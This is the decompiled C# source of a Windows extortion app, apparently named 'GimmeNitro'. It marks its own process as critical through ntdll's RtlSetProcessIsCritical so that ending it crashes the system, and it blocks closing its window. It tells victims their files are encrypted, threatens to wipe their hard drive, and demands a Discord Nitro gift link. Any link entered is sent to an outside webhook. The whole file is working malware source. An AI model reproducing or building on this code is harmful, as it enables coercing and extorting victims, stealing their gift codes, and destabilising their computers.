using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace BaseMent;

public class Form1 : Form
{
	public static class Unkillable
	{
		[DllImport("ntdll.dll", SetLastError = true)]
		private static extern void RtlSetProcessIsCritical(uint v1, uint v2, uint v3);

		public static void MakeProcessUnkillable()
		{
			Process.EnterDebugMode();
			RtlSetProcessIsCritical(1u, 0u, 0u);
		}

		public static void MakeProcessKillable()
		{
			RtlSetProcessIsCritical(0u, 0u, 0u);
		}
	}

	private IContainer components = null;

	private Label label1;

	private Button button2;

	private Button button1;

	private Label label2;

	private Label label3;

	private TextBox textBox1;

	private TextBox textBox2;

	private RichTextBox richTextBox1;

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		tryme();
		MessageBox.Show("Process cannot be stopped anymore hahahahhahah", "GimmeNitro.Died");
	}

	private static void tryme()
	{
		Unkillable.MakeProcessUnkillable();
	}

	private void button2_Click(object sender, EventArgs e)
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show("Not valid key", "Dont play with me");
	}

	private void button1_Click(object sender, EventArgs e)
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		if (NitroValid())
		{
			MessageBox.Show("Seems legit, wait till app gets removed", "WindowsSecuritySystemLOL");
		}
		else
		{
			MessageBox.Show("So u want to play around?", "DemonInUrPC :))))))))))))))))))");
		}
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Invalid comparison between Unknown and I4
		((CancelEventArgs)(object)e).Cancel = (int)e.get_CloseReason() == 3;
	}

	private bool NitroValid()
	{
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ca: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ea: Unknown result type (might be due to invalid IL or missing references)
		Webhook webhook = new Webhook(Program.WEBHOOK);
		string text = ((Control)textBox2).get_Text();
		string empty = string.Empty;
		if (text.Contains("discord.gift/"))
		{
			if (text.Contains("https://"))
			{
				int num = text.IndexOf("/");
				empty = text.Substring(num + 15);
			}
			else
			{
				int num2 = text.IndexOf("/");
				empty = text.Substring(num2 + 1);
				MessageBox.Show("If its not valid....", "Better be legit :)", (MessageBoxButtons)0, (MessageBoxIcon)64);
			}
			if (Nitro.Check(empty))
			{
				webhook.Send("**Valid nitro code was received**");
				webhook.Send(text);
				MessageBox.Show("U need to wait till it gets Decrypted, Dont shutdown ur PC", "HAHAHAHHAHAHAHHAHAHAHAHHA", (MessageBoxButtons)0, (MessageBoxIcon)64);
				return true;
			}
			webhook.Send("```User sent invalid discord gift Link.```");
			MessageBox.Show("Dont play with me.", "DieDieDieDie", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
		else
		{
			webhook.Send("```User sent invalid discord gift Link.```");
			MessageBox.Show("Just enter the link, Not that hard.", "DieDieDieDie", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
		return false;
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_007d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0087: Expected O, but got Unknown
		//IL_01fd: Unknown result type (might be due to invalid IL or missing references)
		//IL_0207: Expected O, but got Unknown
		//IL_0280: Unknown result type (might be due to invalid IL or missing references)
		//IL_028a: Expected O, but got Unknown
		//IL_04db: Unknown result type (might be due to invalid IL or missing references)
		//IL_04e5: Expected O, but got Unknown
		label1 = new Label();
		button2 = new Button();
		button1 = new Button();
		label2 = new Label();
		label3 = new Label();
		textBox1 = new TextBox();
		textBox2 = new TextBox();
		richTextBox1 = new RichTextBox();
		((Control)this).SuspendLayout();
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Palatino Linotype", 24f, (FontStyle)3, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_Location(new Point(107, 9));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(414, 43));
		((Control)label1).set_TabIndex(0);
		((Control)label1).set_Text("Ur files have been encrypted");
		((Control)button2).set_Location(new Point(437, 315));
		((Control)button2).set_Name("button2");
		((Control)button2).set_Size(new Size(132, 47));
		((Control)button2).set_TabIndex(2);
		((Control)button2).set_Text("Validate Decrypt key");
		((ButtonBase)button2).set_UseVisualStyleBackColor(true);
		((Control)button2).add_Click((EventHandler)button2_Click);
		((Control)button1).set_Location(new Point(168, 315));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(132, 47));
		((Control)button1).set_TabIndex(3);
		((Control)button1).set_Text("Validate Nitro");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Font(new Font("Microsoft Sans Serif", 15.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label2).set_Location(new Point(163, 219));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(108, 25));
		((Control)label2).set_TabIndex(4);
		((Control)label2).set_Text("Nitro link: ");
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Font(new Font("Microsoft Sans Serif", 15.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label3).set_Location(new Point(163, 284));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(61, 25));
		((Control)label3).set_TabIndex(5);
		((Control)label3).set_Text("Key: ");
		((Control)textBox1).set_Location(new Point(277, 225));
		((Control)textBox1).set_Name("textBox1");
		((Control)textBox1).set_Size(new Size(292, 20));
		((Control)textBox1).set_TabIndex(6);
		((Control)textBox2).set_Location(new Point(230, 289));
		((Control)textBox2).set_Name("textBox2");
		((Control)textBox2).set_Size(new Size(339, 20));
		((Control)textBox2).set_TabIndex(7);
		((Control)richTextBox1).set_Location(new Point(115, 83));
		((Control)richTextBox1).set_Name("richTextBox1");
		((Control)richTextBox1).set_Size(new Size(484, 52));
		((Control)richTextBox1).set_TabIndex(8);
		((Control)richTextBox1).set_Text("U can unlock ur PC and ur files with 1Month of Discord Nitro. By trying to remove me i will destroy ur harddrive :) . ");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(SystemColors.InfoText);
		((Form)this).set_ClientSize(new Size(705, 396));
		((Control)this).get_Controls().Add((Control)(object)richTextBox1);
		((Control)this).get_Controls().Add((Control)(object)textBox2);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)button2);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).set_Cursor(Cursors.get_Cross());
		((Control)this).set_ForeColor(Color.Red);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("Form1");
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
